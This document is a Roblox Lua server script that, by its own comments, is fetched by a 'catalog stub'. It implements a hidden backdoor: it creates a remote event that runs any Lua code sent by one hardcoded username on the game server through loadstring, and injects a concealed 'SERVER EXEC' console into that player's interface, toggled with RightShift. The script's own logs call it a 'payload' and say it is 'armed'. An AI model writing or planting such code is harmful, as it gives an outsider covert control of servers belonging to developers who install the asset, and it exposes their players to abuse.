-- gate.lua
-- Owner-gate server executor. Fetched by the catalog stub.
-- All logic lives here. Stub just loads this.

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local ALLOWED_NAMES = {
    ["ramal04198"] = true,
}

if not RunService:IsServer() then return end

local VERSION = "1.0.0"
print("[OwnerGate] payload v" .. VERSION)

-- remote
local remote = ReplicatedStorage:FindFirstChild("OwnerExec_Remote")
if not remote then
    remote = Instance.new("RemoteEvent")
    remote.Name = "OwnerExec_Remote"
    remote.Parent = ReplicatedStorage
end

-- server executor with captured output
local function runOnServer(code)
    local fn, err = loadstring(code)
    if not fn then
        return false, "compile error: " .. tostring(err)
    end

    local captured = {}
    local oldPrint = print
    print = function(...)
        local parts = {}
        for i = 1, select("#", ...) do
            parts[#parts + 1] = tostring(select(i, ...))
        end
        captured[#captured + 1] = table.concat(parts, " ")
        oldPrint("[exec]", ...)
    end

    local ok, result = pcall(fn)
    print = oldPrint

    local tail = ""
    if #captured > 0 then
        tail = "\n" .. table.concat(captured, "\n")
    end

    if not ok then
        return false, "runtime error: " .. tostring(result) .. tail
    end
    return true, tostring(result) .. tail
end

-- gate + dispatch
remote.OnServerEvent:Connect(function(player, code)
    if not ALLOWED_NAMES[player.Name] then
        player:Kick("access denied")
        return
    end

    if type(code) ~= "string" then return end
    if #code == 0 or #code > 20000 then return end

    print("[OwnerGate] exec from " .. player.Name .. ", " .. #code .. " bytes")

    local ok, msg = runOnServer(code)
    if not ok then
        warn("[OwnerGate] " .. msg)
    else
        if msg and msg ~= "" then
            print("[OwnerGate] result: " .. msg)
        end
    end
end)

-- client payload source
local CLIENT_SOURCE = [[
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local remote = ReplicatedStorage:WaitForChild("OwnerExec_Remote")

local gui = Instance.new("ScreenGui")
gui.Name = "OwnerExecGui"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 999999
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 520, 0, 300)
frame.Position = UDim2.new(0.5, -260, 0.5, -150)
frame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 0, 28)
title.Position = UDim2.new(0, 10, 0, 6)
title.BackgroundTransparency = 1
title.Text = "SERVER EXEC — " .. player.Name
title.TextColor3 = Color3.fromRGB(0, 255, 140)
title.Font = Enum.Font.Code
title.TextSize = 16
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = frame

local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 28, 0, 28)
close.Position = UDim2.new(1, -34, 0, 4)
close.BackgroundColor3 = Color3.fromRGB(60, 20, 20)
close.BorderSizePixel = 0
close.Text = "X"
close.TextColor3 = Color3.fromRGB(255, 120, 120)
close.Font = Enum.Font.Code
close.Parent = frame
close.MouseButton1Click:Connect(function() gui.Enabled = false end)

local box = Instance.new("TextBox")
box.Size = UDim2.new(1, -20, 0, 210)
box.Position = UDim2.new(0, 10, 0, 40)
box.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
box.BorderSizePixel = 0
box.ClearTextOnFocus = false
box.MultiLine = true
box.TextXAlignment = Enum.TextXAlignment.Left
box.TextYAlignment = Enum.TextYAlignment.Top
box.TextColor3 = Color3.fromRGB(220, 220, 220)
box.Font = Enum.Font.Code
box.TextSize = 14
box.PlaceholderText = "server lua here"
box.Text = ""
box.Parent = frame

local run = Instance.new("TextButton")
run.Size = UDim2.new(0, 140, 0, 32)
run.Position = UDim2.new(0, 10, 1, -42)
run.BackgroundColor3 = Color3.fromRGB(0, 120, 70)
run.BorderSizePixel = 0
run.Text = "EXECUTE"
run.TextColor3 = Color3.fromRGB(0, 0, 0)
run.Font = Enum.Font.Code
run.TextSize = 16
run.Parent = frame
run.MouseButton1Click:Connect(function()
    remote:FireServer(box.Text)
end)

local clear = Instance.new("TextButton")
clear.Size = UDim2.new(0, 100, 0, 32)
clear.Position = UDim2.new(0, 160, 1, -42)
clear.BackgroundColor3 = Color3.fromRGB(40, 40, 46)
clear.BorderSizePixel = 0
clear.Text = "CLEAR"
clear.TextColor3 = Color3.fromRGB(200, 200, 200)
clear.Font = Enum.Font.Code
clear.TextSize = 16
clear.Parent = frame
clear.MouseButton1Click:Connect(function() box.Text = "" end)

gui.Enabled = false

local UIS = game:GetService("UserInputService")
UIS.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
]]

local function hookPlayer(player)
    if not ALLOWED_NAMES[player.Name] then return end

    -- clean previous instance if re-executed
    local existing = player:FindFirstChild("PlayerScripts")
        and player.PlayerScripts:FindFirstChild("OwnerGate_Client")
    if existing then existing:Destroy() end

    task.spawn(function()
        player:WaitForChild("PlayerGui", 30)
        local scripts = player:WaitForChild("PlayerScripts", 30)
        if not scripts then return end

        local s = Instance.new("LocalScript")
        s.Name = "OwnerGate_Client"
        s.Source = CLIENT_SOURCE
        s.Parent = scripts
    end)
end

Players.PlayerAdded:Connect(hookPlayer)
for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end

-- re-hook on character respawn cleanup safety
Players.PlayerRemoving:Connect(function(p)
    local scripts = p:FindFirstChild("PlayerScripts")
    if scripts then
        local c = scripts:FindFirstChild("OwnerGate_Client")
        if c then c:Destroy() end
    end
end)

print("[OwnerGate] armed. allowed: ramal04198. toggle: RightShift")
